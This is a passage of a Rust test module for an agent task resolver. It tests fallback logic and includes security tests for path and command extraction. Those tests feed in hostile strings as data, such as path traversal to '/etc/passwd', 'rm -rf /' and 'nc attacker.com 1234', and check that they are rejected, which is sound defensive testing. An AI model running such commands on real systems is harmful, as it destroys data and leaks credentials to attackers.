            actions[0].input.get("command").unwrap().as_str(),
            Some("cargo test")
        );
    }

    #[tokio::test]
    async fn test_resolver_explicit_capability_still_works() {
        use cyberclaw_core::task::TaskInput;

        // Test explicit capability request
        let task = Task {
            id: TaskId::from_string("test-explicit-task".to_string()).unwrap(),
            case_id: None,
            title: "Custom task".to_string(),
            summary: "A task with explicit capability".to_string(),
            kind: TaskKind::Execution,
            priority: Priority::Medium,
            requested_by: ActorRef {
                id: ActorId::from_string("tester".to_string()).unwrap(),
                actor_type: ActorType::Human,
                tenant_id: None,
                home_node_id: None,
                display_name: "Tester".to_string(),
            },
            requested_at: chrono::Utc::now(),
            trigger: TriggerRef {
                kind: "manual".to_string(),
                source: "test".to_string(),
            },
            input: TaskInput {
                payload: serde_json::json!({
                    "capability": "fs.write",
                    "params": {
                        "path": "test.txt",
                        "content": "Hello World"
                    }
                }),
            },
            desired_outputs: vec![],
            labels: vec![],
            preferred_agent_id: None,
        };

        let connectors = vec![ConnectorId::from_string("local".to_string()).unwrap()];
        let capabilities = vec![CapabilityId::from_string("fs.write".to_string()).unwrap()];

        let actions = generate_minimal_actions(&task, &connectors, &capabilities).unwrap();

        assert!(!actions.is_empty(), "Expected actions for explicit task");
        assert_eq!(actions[0].capability.as_str(), "fs.write");
        assert!(actions[0].input.get("path").is_some());
        assert_eq!(
            actions[0].input.get("path").unwrap().as_str(),
            Some("test.txt")
        );
        assert_eq!(
            actions[0].input.get("content").unwrap().as_str(),
            Some("Hello World")
        );
    }

    // ========== 错误路径测试 ==========

    #[tokio::test]
    async fn test_resolver_with_empty_agents() {
        let registry = Arc::new(InMemoryRegistry::new());
        let resolver = InMemoryResolver::new(registry);

        let task = Task {
            id: TaskId::from_string("test-task-003".to_string()).unwrap(),
            case_id: None,
            title: "Test Task with Empty Agents".to_string(),
            summary: "Test task with no available agents".to_string(),
            kind: TaskKind::Analysis,
            priority: Priority::High,
            requested_by: ActorRef {
                id: ActorId::from_string("tester".to_string()).unwrap(),
                actor_type: ActorType::Human,
                tenant_id: None,
                home_node_id: None,
                display_name: "Tester".to_string(),
            },
            requested_at: chrono::Utc::now(),
            trigger: TriggerRef {
                kind: "manual".to_string(),
                source: "test".to_string(),
            },
            input: TaskInput::default(),
            desired_outputs: vec![],
            labels: vec![],
            preferred_agent_id: None,
        };

        let resolution_input = ResolutionInput {
            task,
            case: None,
            actor: ActorRef {
                id: ActorId::from_string("tester".to_string()).unwrap(),
                actor_type: ActorType::Human,
                tenant_id: None,
                home_node_id: None,
                display_name: "Tester".to_string(),
            },
            workspace: None,
            session: None,
            available_agents: vec![], // 空列表
            available_skills: vec![],
            available_connectors: vec![],
            available_capabilities: vec![],
            available_workflows: vec![],
        };

        let result = resolver.resolve(resolution_input).await;
        assert!(result.is_err(), "empty agents list should fail");
        let err = result.unwrap_err();
        assert!(
            err.to_string().contains("no agent available"),
            "error should mention no agent available, got: {}",
            err
        );
    }

    #[tokio::test]
    async fn test_resolver_with_nonexistent_packages() {
        let scanner = EcosystemScanner::new("../../ecosystem");
        let packages = scanner.scan_all().await.unwrap();

        let registry = Arc::new(InMemoryRegistry::new());
        registry.load_packages(packages).await.unwrap();

        let resolver = InMemoryResolver::new(registry);

        let task = Task {
            id: TaskId::from_string("test-task-004".to_string()).unwrap(),
            case_id: None,
            title: "Test Task with Nonexistent Packages".to_string(),
            summary: "Test task with packages not in registry".to_string(),
            kind: TaskKind::Analysis,
            priority: Priority::Medium,
            requested_by: ActorRef {
                id: ActorId::from_string("tester".to_string()).unwrap(),
                actor_type: ActorType::Human,
                tenant_id: None,
                home_node_id: None,
                display_name: "Tester".to_string(),
            },
            requested_at: chrono::Utc::now(),
            trigger: TriggerRef {
                kind: "manual".to_string(),
                source: "test".to_string(),
            },
            input: TaskInput::default(),
            desired_outputs: vec![],
            labels: vec![],
            preferred_agent_id: None,
        };

        let resolution_input = ResolutionInput {
            task,
            case: None,
            actor: ActorRef {
                id: ActorId::from_string("tester".to_string()).unwrap(),
                actor_type: ActorType::Human,
                tenant_id: None,
                home_node_id: None,
                display_name: "Tester".to_string(),
            },
            workspace: None,
            session: None,
            available_agents: vec![AgentId::from_string("nonexistent-agent".to_string()).unwrap()],
            available_skills: vec![SkillId::from_string("nonexistent-skill".to_string()).unwrap()],
            available_connectors: vec![ConnectorId::from_string(
                "nonexistent-connector".to_string(),
            )
            .unwrap()],
            available_capabilities: vec![],
            available_workflows: vec![],
        };

        // 应该使用回退逻辑选择第一个 agent（虽然不在 registry 中）
        let result = resolver.resolve(resolution_input).await;
        assert!(result.is_ok(), "should fallback to first agent");

        let resolution = result.unwrap();
        assert_eq!(resolution.agent.as_str(), "nonexistent-agent");

        // skills 和 connectors 应该被过滤掉（因为不在 registry 中）
        assert!(
            resolution.skills.is_empty(),
            "skills not in registry should be filtered"
        );
        assert!(
            resolution.connectors.is_empty(),
            "connectors not in registry should be filtered"
        );

        // reasons 应该包含跳过信息
        assert!(
            resolution.reasons.iter().any(|r| r.contains("fallback")),
            "should mention fallback logic in reasons"
        );
        assert!(
            resolution
                .reasons
                .iter()
                .any(|r| r.contains("skipped skill")),
            "should mention skipped skills in reasons"
        );
        assert!(
            resolution
                .reasons
                .iter()
                .any(|r| r.contains("skipped connector")),
            "should mention skipped connectors in reasons"
        );
    }

    // SECURITY TESTS

    #[test]
    fn test_reject_path_traversal_in_inference() {
        // Test that extract_file_path rejects path traversal attempts
        let title = "Read ../../../etc/passwd file";
        let summary = "Read sensitive system file";

        let path = extract_file_path(title, summary);
        assert!(
            path.is_none(),
            "Should reject path traversal pattern '../../../etc/passwd'"
        );
    }

    #[test]
    fn test_reject_absolute_path_in_inference() {
        // Test that extract_file_path rejects absolute paths
        let title = "Read /etc/passwd";
        let summary = "Read system file";

        let path = extract_file_path(title, summary);
        assert!(path.is_none(), "Should reject absolute path '/etc/passwd'");
    }

    #[test]
    fn test_reject_double_slash_in_path() {
        // Test that extract_file_path rejects paths with double slashes
        let title = "Read config//secret.yaml";
        let summary = "Read configuration";

        let path = extract_file_path(title, summary);
        assert!(
            path.is_none(),
            "Should reject path with double slashes 'config//secret.yaml'"
        );
    }

    #[test]
    fn test_reject_deep_path_traversal() {
        // Test that extract_file_path rejects paths with too many components
        let title = "Read a/b/c/d/e/f/g/deep.txt";
        let summary = "Read deeply nested file";

        let path = extract_file_path(title, summary);
        assert!(
            path.is_none(),
            "Should reject path with more than 5 components"
        );
    }

    #[test]
    fn test_accept_safe_relative_path() {
        // Test that extract_file_path accepts safe relative paths
        let title = "Read README.md file";
        let summary = "Read the readme";

        let path = extract_file_path(title, summary);
        assert_eq!(
            path,
            Some("README.md".to_string()),
            "Should accept safe path 'README.md'"
        );
    }

    #[test]
    fn test_accept_safe_nested_path() {
        // Test that extract_file_path accepts safe nested paths (within limits)
        let title = "Read src/main.rs";
        let summary = "Read the main source file";

        let path = extract_file_path(title, summary);
        assert_eq!(
            path,
            Some("src/main.rs".to_string()),
            "Should accept safe nested path 'src/main.rs'"
        );
    }

    #[test]
    fn test_reject_command_injection_in_inference() {
        // Test that extract_command rejects command injection attempts
        let text_variants = [
            "run tests && rm -rf / || echo pwned",
            "execute build; cat /etc/passwd",
            "run malicious | nc attacker.com 1234",
        ];

        for text in &text_variants {
            let cmd = extract_command(&text.to_lowercase());
            // Should either return None or a safe whitelisted command
            if let Some(command) = cmd {
                // If it returns something, it must be a safe command
                assert!(
                    command == "cargo test"
                        || command == "cargo build"
                        || command == "cargo check"
                        || command == "cargo fmt"
                        || command == "cargo clippy",
                    "Returned command '{}' must be from whitelist for input '{}'",
                    command,
                    text
                );
                // And must not contain shell metacharacters
                assert!(
                    !command.contains("&&")
                        && !command.contains("||")
                        && !command.contains(";")
                        && !command.contains("|"),
                    "Returned command '{}' must not contain shell metacharacters",
                    command
                );
            }
        }
    }

    #[test]
    fn test_extract_command_whitelist_only() {
        // Test that extract_command only returns whitelisted commands
        let test_cases = [
            ("run tests", Some("cargo test")),
            ("run build", Some("cargo build")),
            ("run check", Some("cargo check")),
            ("run format", Some("cargo fmt")),
            ("run clippy", Some("cargo clippy")),
            ("run malicious_script.sh", None),   // Not in whitelist
            ("execute arbitrary command", None), // Not in whitelist
        ];

        for (input, expected) in &test_cases {
            let result = extract_command(&input.to_lowercase());
            assert_eq!(
                result.as_deref(),
                expected.as_deref(),
                "For input '{}', expected {:?}, got {:?}",
                input,
                expected,
                result
            );
        }
    }
}
